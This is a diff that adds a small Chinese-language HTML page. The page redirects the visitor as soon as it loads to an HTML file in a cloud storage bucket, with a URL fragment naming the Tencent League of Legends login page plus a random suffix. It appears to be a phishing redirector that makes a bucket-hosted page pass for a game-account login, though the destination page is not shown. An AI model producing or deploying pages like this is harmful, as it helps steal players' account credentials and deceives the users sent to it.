@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>自动跳转页面</title>
+<script>
+function generateRandomString(length) {
+    var result = '';
+    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for (var i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+function redirectToRandom() {
+    var randomString = generateRandomString(10); // 生成10个字符的随机字符串
+    var targetUrl = "https://cdc-ucloud-1258344706.cos.ap-guangzhou.myqcloud.com/upload/2024/0303/5f7c2c582b0870e1582fc4f636e2c28b.html#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html?" + randomString; // 目标URL，参数为随机字符串
+    window.location.href = targetUrl; // 自动跳转到目标URL
+}
+</script>
+</head>
+<body onload="redirectToRandom()">
+
+<h1>自动跳转中...</h1>
+<p>如果您没有自动跳转，请点击以下链接：<a href="javascript:redirectToRandom()">点击这里</a></p>
+
+</body>
+</html>
